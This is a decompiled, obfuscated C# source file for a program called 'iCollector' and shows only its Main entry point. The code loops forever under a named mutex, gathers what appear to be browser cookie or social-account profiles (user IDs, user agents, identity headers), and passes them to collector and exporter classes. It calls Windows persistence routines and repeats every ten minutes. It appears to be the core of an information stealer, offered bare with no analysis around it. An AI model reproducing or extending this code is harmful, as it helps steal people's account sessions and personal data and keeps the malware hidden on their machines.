using System;
using System.Collections.Generic;
using System.Threading;
using iCollector.Job.Handler;
using iCollector.Job.Model;
using iCollector.Model;
using iCollector.Util;

namespace iCollector;

internal class Program
{
	private static string ENV_NAME;

	private static bool IS_ENV_TEST;

	private static bool CreatedMutex;

	private static Mutex m;

	private static Logger log;

	private static LogContext ctx;

	private static ClientInfo GetClientInfo(CKModelHolder holder)
	{
		while (true)
		{
			if (holder == null)
			{
				goto IL_0003;
			}
			int num;
			if (holder.Models != null)
			{
				num = 7;
				while (num != 0)
				{
					num = 0;
					if (num != 0)
					{
						continue;
					}
					goto IL_0014;
				}
				continue;
			}
			goto IL_0023;
			IL_0014:
			if (num != 0 || holder.Models.Count != 0)
			{
				if ((4 == 0 || 0 == 0) && 0 == 0)
				{
					break;
				}
				goto IL_0003;
			}
			goto IL_0023;
			IL_0003:
			return null;
			IL_0023:
			return null;
		}
		return holder.Models[0].ClientInfo;
	}

	public static void Main(string[] args)
	{
		try
		{
			m = new Mutex(initiallyOwned: true, "APPXALO", out CreatedMutex);
		}
		catch (Exception)
		{
		}
		CKProfile cKProfile = default(CKProfile);
		while (true)
		{
			CacheRepository.RestoreCache();
			CacheRepository.PersistCache();
			while (6u != 0)
			{
				CacheRepository.GetGUID();
				if (false)
				{
					continue;
				}
				WinAPI.FindAndOpenContent();
				Console.WriteLine("CreatedMutex: " + CreatedMutex);
				int num = (CreatedMutex ? 1 : 0);
				MainCollector mainCollector;
				MainExporter mainExporter;
				Logger logger;
				LogContext logContext;
				if (0 == 0)
				{
					if (num == 0)
					{
						return;
					}
					SecurityUtils.Init();
					ProfileUtils.InitWithEnv(ENV_NAME);
					mainCollector = new MainCollector();
					mainExporter = new MainExporter();
					logger = Logger.Instance();
					logContext = new LogContext("Program");
					CKModelHolder cKModelHolder = null;
					num = 0;
				}
				bool flag = (byte)num != 0;
				while (true)
				{
					logger.Info(logContext, "Start Counter = " + CacheRepository.IncrementAndGetRanTimes() + ", Version = " + CacheRepository.VERSION);
					mainExporter.MakeStartSignal();
					CKModelHolder cKModelHolder = new CKResolver().Resolve();
					try
					{
						List<CKProfile>.Enumerator enumerator = cKModelHolder.PriorityProfiles.GetEnumerator();
						List<CKProfile>.Enumerator enumerator2;
						if (3u != 0)
						{
							enumerator2 = enumerator;
						}
						try
						{
							if (0 == 0)
							{
								goto IL_01f5;
							}
							goto IL_00f2;
							IL_00f2:
							if (string.IsNullOrEmpty(cKProfile.ResourceUID))
							{
								if (4u != 0)
								{
									CacheRepository.PersistCache();
								}
								CKProfile profile = cKProfile;
								if (0 == 0)
								{
									mainExporter.Export(profile);
								}
								goto IL_01f5;
							}
							if (cKProfile.SocialProfile == null)
							{
								SocialProfile obj = new SocialProfile
								{
									UserId = cKProfile.ResourceUID,
									UA = cKProfile.ClientInfo.UA,
									IdentityHeader = cKProfile.ResourceIdHeader
								};
								string name = cKProfile.Name;
								if (0 == 0)
								{
									obj.profileId = name;
								}
								SocialProfile socialProfile;
								if (7u != 0)
								{
									socialProfile = obj;
								}
								if (false)
								{
									goto IL_01e0;
								}
								CKProfile cKProfile2 = cKProfile;
								if (3u != 0)
								{
									cKProfile2.SocialProfile = socialProfile;
								}
							}
							else
							{
								SocialProfile socialProfile2 = cKProfile.SocialProfile;
								string resourceUID = cKProfile.ResourceUID;
								if (6u != 0)
								{
									socialProfile2.UserId = resourceUID;
								}
								SocialProfile socialProfile3 = cKProfile.SocialProfile;
								string uA = cKProfile.ClientInfo.UA;
								if (2u != 0)
								{
									socialProfile3.UA = uA;
								}
								SocialProfile socialProfile4 = cKProfile.SocialProfile;
								string resourceIdHeader = cKProfile.ResourceIdHeader;
								if (0 == 0)
								{
									socialProfile4.IdentityHeader = resourceIdHeader;
								}
								SocialProfile socialProfile5 = cKProfile.SocialProfile;
								string name2 = cKProfile.Name;
								if (0 == 0)
								{
									socialProfile5.profileId = name2;
								}
							}
							goto IL_01d5;
							IL_01d5:
							CKProfile ckProfile = cKProfile;
							if (0 == 0)
							{
								mainCollector.Collect(ckProfile);
							}
							goto IL_01e0;
							IL_01e0:
							CacheRepository.PersistCache();
							WinAPI.PersistenceInstance();
							mainExporter.Export(cKProfile);
							flag = true;
							goto IL_01f5;
							IL_01f5:
							if (enumerator2.MoveNext())
							{
								CKProfile current = enumerator2.Current;
								if (uint.MaxValue != 0)
								{
									cKProfile = current;
								}
								goto IL_00f2;
							}
							if (7 == 0)
							{
								goto IL_01d5;
							}
						}
						finally
						{
							((IDisposable)enumerator2).Dispose();
						}
						enumerator2 = cKModelHolder.NonValueProfiles.GetEnumerator();
						try
						{
							while (true)
							{
								int num2 = (enumerator2.MoveNext() ? 1 : 0);
								if (2u != 0)
								{
									if (num2 == 0)
									{
										break;
									}
									CKProfile current2 = enumerator2.Current;
									mainExporter.Export(current2);
									num2 = 1;
								}
								flag = (byte)num2 != 0;
							}
						}
						finally
						{
							if (0 == 0)
							{
								((IDisposable)enumerator2).Dispose();
							}
						}
					}
					catch (Exception ex2)
					{
						logger.Error(logContext, ex2.ToString());
					}
					finally
					{
						if (!flag)
						{
							try
							{
								mainExporter.Export(GetClientInfo(cKModelHolder));
							}
							catch (Exception ex3)
							{
								logger.Error(logContext, ex3.ToString());
							}
						}
						else
						{
							WinAPI.PersistenceInstance();
						}
						CacheRepository.PersistCache();
						do
						{
							logger.Info(logContext, "Waiting for next turn");
							Thread.Sleep(TimeSpan.FromMinutes(10.0));
						}
						while ((1 == 0) ? true : false);
						logger.Clear();
					}
				}
			}
		}
	}

	static Program()
	{
		if (false || (0 == 0 && 4 == 0))
		{
			return;
		}
		ENV_NAME = "7";
		if (3u != 0)
		{
			int num = ("TEST".Equals(ENV_NAME) ? 1 : 0);
			do
			{
				IS_ENV_TEST = (byte)num != 0;
				num = 1;
			}
			while (num == 0 || 2 == 0);
			CreatedMutex = (byte)num != 0;
		}
		log = Logger.Instance();
		ctx = new LogContext("Program");
	}
}
